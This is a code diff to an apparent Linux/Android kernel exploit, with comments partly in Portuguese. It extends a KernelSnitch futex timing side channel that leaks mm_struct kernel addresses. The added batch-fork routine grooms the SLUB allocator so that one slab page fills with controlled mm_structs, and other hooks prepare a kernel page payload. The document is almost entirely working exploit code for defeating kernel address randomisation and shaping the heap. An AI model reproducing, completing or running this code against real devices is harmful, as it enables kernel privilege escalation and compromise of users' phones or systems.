@@ -440,7 +440,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 #endif
 
 void setup_kernelsnitch(void) {
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int cpu_count = 16;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
@@ -448,7 +448,7 @@ void setup_kernelsnitch(void) {
   configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   kernelsnitch_set_profile(
       ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
@@ -940,23 +940,33 @@ static int controlled_mm_valid(uintptr_t mm) {
 
 static uintptr_t controlled_mm_match_page(
     const struct kernelsnitch_shared_state *state, uintptr_t base) {
-  uintptr_t found = (uintptr_t)-1;
-  size_t count = 0;
+  size_t collisions = state->collisions;
+  if (collisions < 2) { pr_info("match_page: skip collisions=%zu\n", collisions); return (uintptr_t)-1; }
 
+  pr_info("match_page: base=%016zx collisions=%zu fa0=%016zx fa1=%016zx\n",
+          base, collisions,
+          (size_t)state->futex_addrs[0],
+          collisions > 1 ? (size_t)state->futex_addrs[1] : 0);
+
+  size_t tested = 0;
   for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
        candidate += MM_STRUCT_SZ) {
+    tested++;
     size_t hash = futex_hash(state->futex_addrs[0], candidate);
     size_t matches = 1;
 
-    for (size_t i = 1; i < state->collisions; ++i) {
+    for (size_t i = 1; i < collisions; ++i) {
       matches += hash == futex_hash(state->futex_addrs[i], candidate);
     }
-    if (matches == state->collisions) {
-      found = candidate;
-      count++;
+    if (matches == collisions) {
+      pr_info("match_page: FOUND candidate=%016zx (tested=%zu)\n", candidate, tested);
+      return candidate;
     }
   }
-  return count == 1 ? found : (uintptr_t)-1;
+  pr_info("match_page: no match in [%016zx, %016zx) tested=%zu fa0=%016zx fa1=%016zx\n",
+          base, base + ORDER3_SIZE, tested,
+          (size_t)state->futex_addrs[0], (size_t)state->futex_addrs[1]);
+  return (uintptr_t)-1;
 }
 
 #if defined(QEMU_MM_TRACE_ORACLE) || defined(QEMU_MM_TRACE_VALIDATE)
@@ -1081,7 +1091,7 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
   *hint_hit = 0;
   for (size_t pass = 0; pass < passes; ++pass) {
     struct kernelsnitch_shared_state *state = kernelsnitch_setup(
-        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
+        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
     pid_t child;
     int fd;
     int status;
@@ -1142,7 +1152,15 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
       kernelsnitch_cleanup(state);
       return -2;
     }
-    *mm_out = state->mm_struct;
+      pr_info("dbg_leak: mm=%016zx mm_slab=%016zx hint=%016zx hint_slab=%016zx hit=%d same=%d\n",
+          state->mm_struct,
+          state->mm_struct & ~(ORDER3_SIZE - 1),
+          hint,
+          hint & ~(ORDER3_SIZE - 1),
+          *hint_hit,
+          ((state->mm_struct & ~(ORDER3_SIZE - 1)) ==
+           (hint & ~(ORDER3_SIZE - 1))) ? 1 : 0);
+  *mm_out = state->mm_struct;
 #ifdef QEMU_MM_TRACE_VALIDATE
     pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
             "hint=%d\n",
@@ -1164,8 +1182,272 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
 #endif
 }
 
+
+/*
+ * batch_controlled_mm_group - Fork em lote para preencher uma pagina slab.
+ *
+ * Em vez de fork-um-scan-um (que espalha mm_structs por muitas paginas),
+ * faz fork de muitos filhos rapidamente no mesmo CPU. O SLUB serve do
+ * freelist per-CPU, entao forks consecutivos rapidos caem na mesma pagina.
+ * Depois escaneia cada filho para encontrar o endereco mm_struct e
+ * preencher todos os 34 slots.
+ *
+ * Retorna 0 em sucesso (base_out e chosen_fds preenchidos), -1 em falha.
+ */
+static int batch_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
+                                      int *chosen_fds) {
+  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
+  const size_t fcount = S918_BATCH_FORK_COUNT;
+  size_t i;
+
+  /* Blocos de controle compartilhados parent<->child */
+  volatile int *ctl_go   = mmap(NULL, fcount * sizeof(int),
+      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
+  volatile int *ctl_done = mmap(NULL, fcount * sizeof(int),
+      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
+  volatile int *ctl_res  = mmap(NULL, fcount * sizeof(int),
+      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
+  pid_t *bpids = mmap(NULL, fcount * sizeof(pid_t),
+      PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  int *bmfds = mmap(NULL, fcount * sizeof(int),
+      PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  struct kernelsnitch_shared_state **bsts = mmap(NULL, fcount * sizeof(void*),
+      PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+  if (ctl_go == MAP_FAILED || ctl_done == MAP_FAILED || ctl_res == MAP_FAILED ||
+      bpids == MAP_FAILED || bmfds == MAP_FAILED || bsts == MAP_FAILED) {
+    pr_info("batch: mmap failed\n");
+    if (ctl_go   != MAP_FAILED) munmap((void*)ctl_go,   fcount*sizeof(int));
+    if (ctl_done != MAP_FAILED) munmap((void*)ctl_done,  fcount*sizeof(int));
+    if (ctl_res  != MAP_FAILED) munmap((void*)ctl_res,   fcount*sizeof(int));
+    if (bpids    != MAP_FAILED) munmap(bpids,            fcount*sizeof(pid_t));
+    if (bmfds    != MAP_FAILED) munmap(bmfds,            fcount*sizeof(int));
+    if (bsts     != MAP_FAILED) munmap(bsts,             fcount*sizeof(void*));
+    return -1;
+  }
+
+  int ret = -1;
+
+  for (int round = 0; round < S918_BATCH_ROUNDS && ret != 0; round++) {
+    size_t nst = 0, forked = 0;
+    uintptr_t page_base = 0;
+    size_t page_count = 0;
+    int slot_fd[64];
+    int slot_seen[64];
+    int waited;
+
+    memset((void*)ctl_go,   0, fcount * sizeof(int));
+    memset((void*)ctl_done,  0, fcount * sizeof(int));
+    memset((void*)ctl_res,   0, fcount * sizeof(int));
+    for (i = 0; i < 64; i++) { slot_fd[i] = -1; slot_seen[i] = 0; }
+    for (i = 0; i < fcount; i++) { bpids[i] = 0; bmfds[i] = -1; bsts[i] = NULL; }
+
+    pr_info("batch: === round=%d/%d ===\n", round+1, S918_BATCH_ROUNDS);
+
+    /* ---- Fase 1: criar kernelsnitch states ---- */
+    for (i = 0; i < fcount; i++) {
+      bsts[i] = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count,
+          S918_KSNITCH_FULL_COLLISIONS, KERNELSNITCH_VERBOSE,
+          KERNELSNITCH_MTE_ENABLED);
+      if (!bsts[i]) break;
+      /* Primeiros 3: precisao alta (para bruteforce). Resto: rapido (para match_page) */
+      kernelsnitch_set_profile(bsts[i],
+          (i < 3) ? 256 : S918_BATCH_PROFILE_FAST,
+          REPEAT_MEASUREMENT, AVERAGE);
+      nst++;
+    }
+    pr_info("batch: states=%zu\n", nst);
+    if (nst < batch) {
+      pr_info("batch: not enough states (%zu < %zu)\n", nst, batch);
+      goto batch_round_cleanup;
+    }
+
+    /* ---- Fase 2: fork rapido no mesmo CPU ---- */
+    pin_to_core(CORE);
+    for (i = 0; i < nst; i++) {
+      pid_t p = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
+      if (p < 0) break;
+      if (p == 0) {
+        /* ==== Codigo do filho i ==== */
+        SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+        if (getppid() == 1) _exit(2);
+        /* Espera sinal do pai */
+        while (!ctl_go[i]) usleep(50);
+        /* Exercita futex */
+        kernelsnitch_find_collisions(bsts[i]);
+        ctl_res[i] = kernelsnitch_found_collisions(bsts[i]) ? 0 : 4;
+        __sync_synchronize();
+        ctl_done[i] = 1;
+        /* Fica vivo para manter mm_struct alocado */
+        pause();
+        _exit(0);
+      }
+      bpids[i] = p;
+      bmfds[i] = open_memfd(p);
+      forked++;
+    }
+    pr_info("batch: forked=%zu on cpu\n", forked);
+    if (forked < batch) {
+      pr_info("batch: not enough forks (%zu < %zu)\n", forked, batch);
+      goto batch_round_cleanup;
+    }
+
+    /* ---- Fase 3: escanear filhos sequencialmente ---- */
+    for (i = 0; i < forked && page_count < batch; i++) {
+      uintptr_t mm, this_base;
+      size_t slot;
+
+      /* Sinaliza filho para comecar */
+      ctl_go[i] = 1;
+      __sync_synchronize();
+
+      /* Espera filho terminar (max 15 seg) */
+      for (waited = 0; !ctl_done[i] && waited < 15000; waited++)
+        usleep(1000);
+
+      if (!ctl_done[i]) {
+        pr_info("batch: child %zu timeout\n", i);
+        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
+        continue;
+      }
+      if (ctl_res[i] != 0) {
+        pr_info("batch: child %zu no collisions\n", i);
+        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
+        continue;
+      }
+
+      /* Encontrar endereco mm_struct */
+      if (page_base) {
+        /* Caminho rapido: match contra pagina conhecida */
+        mm = controlled_mm_match_page(bsts[i], page_base);
+      } else {
+        /* Primeiro hit: bruteforce completo */
+        kernelsnitch_bruteforce(bsts[i]);
+        mm = bsts[i]->mm_struct;
+      }
+
+      if (mm == (uintptr_t)-1) {
+        bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
+        pr_info("batch: child %zu mm not found\n", i);
+        continue;
+      }
+      bsts[i]->found = 1;
+      bsts[i]->state = KERNELSNITCH_MM_FOUND;
+
+      /* Validar */
+      if (!controlled_mm_valid(mm)) {
+        pr_info("batch: child %zu invalid mm=%016zx\n", i, (size_t)mm);
+        continue;
+      }
+
+      /* Checar zona */
+      if (controlled_mm_zone_of(mm) != CONTROLLED_MM_NORMAL) {
+        pr_info("batch: child %zu dma32 mm=%016zx\n", i, (size_t)mm);
+        if (!page_base) {
+          /* Primeiro hit eh DMA32: toda a pagina eh DMA32.
+           * Pula para o proximo grupo de filhos (proxima pagina SLUB). */
+          size_t jump = ((i / batch) + 1) * batch;
+          if (jump < forked) {
+            pr_info("batch: dma32 page, skip to child %zu\n", jump);
+            i = jump - 1; /* -1 porque o loop incrementa */
+          } else {
+            pr_info("batch: dma32, no more pages\n");
+            break;
+          }
+        }
+        continue;
+      }
+
+      /* Calcular base e slot */
+      this_base = mm & ~(ORDER3_SIZE - 1);
+      slot = (mm - this_base) / MM_STRUCT_SZ;
+
+      if (!page_base) {
+        page_base = this_base;
+        pr_info("batch: NORMAL page_base=%016zx child=%zu slot=%zu\n",
+                (size_t)page_base, i, slot);
+      }
+
+      if (this_base != page_base) {
+        pr_info("batch: child %zu different page %016zx\n", i, (size_t)this_base);
+        continue;
+      }
+
+      if (slot >= batch || slot_seen[slot]) {
+        pr_info("batch: child %zu slot=%zu %s\n", i, slot,
+                slot >= batch ? "oob" : "dup");
+        continue;
+      }
+
+      slot_seen[slot] = 1;
+      slot_fd[slot] = bmfds[i];
+      bmfds[i] = -1; /* nao fechar esse fd no cleanup */
+      page_count++;
+      pr_info("batch: child %zu mm=%016zx slot=%zu count=%zu/%zu\n",
+              i, (size_t)mm, slot, page_count, batch);
+    }
+
+    pr_info("batch: round=%d final count=%zu/%zu\n", round+1, page_count, batch);
+
+    if (page_count >= batch) {
+      /* SUCESSO! */
+      *base_out = page_base;
+      for (i = 0; i < batch; i++) chosen_fds[i] = slot_fd[i];
+      ret = 0;
+      pr_info("batch: SUCCESS base=%016zx\n", (size_t)page_base);
+    } else {
+      /* Falhou - fechar fds coletados */
+      for (i = 0; i < 64; i++) {
+        if (slot_fd[i] >= 0) { close(slot_fd[i]); slot_fd[i] = -1; }
+      }
+    }
+
+batch_round_cleanup:
+    /* Desbloquear todos os filhos e matar */
+    for (i = 0; i < fcount; i++) { ctl_go[i] = 1; }
+    __sync_synchronize();
+    usleep(10000); /* 10ms para filhos despertarem do usleep */
+    for (i = 0; i < forked; i++) {
+      if (bpids[i] > 0) {
+        kill(bpids[i], SIGKILL);
+        waitpid(bpids[i], NULL, 0);
+      }
+      if (bmfds[i] >= 0) close(bmfds[i]);
+    }
+    for (i = 0; i < nst; i++) {
+      if (bsts[i]) {
+        if (bsts[i]->state != KERNELSNITCH_MM_FOUND &&
+            bsts[i]->state != KERNELSNITCH_MM_NOT_FOUND)
+          bsts[i]->state = KERNELSNITCH_MM_NOT_FOUND;
+        kernelsnitch_cleanup(bsts[i]);
+        bsts[i] = NULL;
+      }
+    }
+  }
+
+  /* Cleanup final das mmaps */
+  munmap((void*)ctl_go,   fcount*sizeof(int));
+  munmap((void*)ctl_done,  fcount*sizeof(int));
+  munmap((void*)ctl_res,   fcount*sizeof(int));
+  munmap(bpids,            fcount*sizeof(pid_t));
+  munmap(bmfds,            fcount*sizeof(int));
+  munmap(bsts,             fcount*sizeof(void*));
+  return ret;
+}
+
+
 static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                        int *chosen_fds) {
+  /* Tenta batch fork primeiro */
+  {
+    int batch_ret = batch_controlled_mm_group(cpu_count, base_out, chosen_fds);
+    if (batch_ret == 0) {
+      pr_info("batch fork succeeded\n");
+      return 0;
+    }
+    pr_info("batch fork failed (%d), sequential fallback\n", batch_ret);
+  }
+
   const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
   const size_t max_groups = 64;
   const size_t opaque_capacity = S918_PAGE_SCAN_MAX * batch;
@@ -1193,6 +1475,13 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
   pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
           S918_PAGE_SCAN_MAX, batch, S918_DMA32_SKIP_SLABS);
 
+  /* Pre-spray: fork dummy children to fill partial SLAB pages.
+     No pipes — children block on pause(), self-destruct via alarm.
+     Runs once; children persist across retries to keep pages full. */
+  /* spray removed - batch fork used */
+
+
+
   for (unsigned long attempt = 1;
        attempt <= S918_PAGE_SCAN_MAX && !result; ++attempt) {
     uintptr_t mm = 0;
@@ -1209,7 +1498,7 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
       break;
     }
     if (!controlled_mm_valid(mm)) {
-      SYSCHK(close(fd));
+      if (opaque_count < opaque_capacity) opaque[opaque_count++] = fd; else SYSCHK(close(fd));
       continue;
     }
     base = mm & ~(ORDER3_SIZE - 1);
@@ -1246,12 +1535,13 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
               attempt, group, base, hint_hit);
     }
     if (group == max_groups || slot >= batch) {
-      SYSCHK(close(fd));
+      if (opaque_count < opaque_capacity) opaque[opaque_count++] = fd; else SYSCHK(close(fd));
+      hint = 0;
       continue;
     }
     if (seen[group * batch + slot]) {
-      SYSCHK(close(fd));
-      hint = base;
+      if (opaque_count < opaque_capacity) opaque[opaque_count++] = fd; else SYSCHK(close(fd));
+      hint = 0;
       pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
               "base=%016zx slot=%zu\n",
               attempt, group, base, slot);
@@ -1909,7 +2199,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
     APP_CONTROLLED_MM_GROUP_RECLAIM
 static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int cpu_count = 16;
   int *target_fds;
   int shaping_sv[2] = {-1, -1};
   uintptr_t base = 0;
@@ -2082,7 +2372,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   touch_mm_slabinfo();
 #endif
 
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int cpu_count = 16;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
@@ -2105,7 +2395,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   configure_kernelsnitch_profile(ks, payload_mode);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
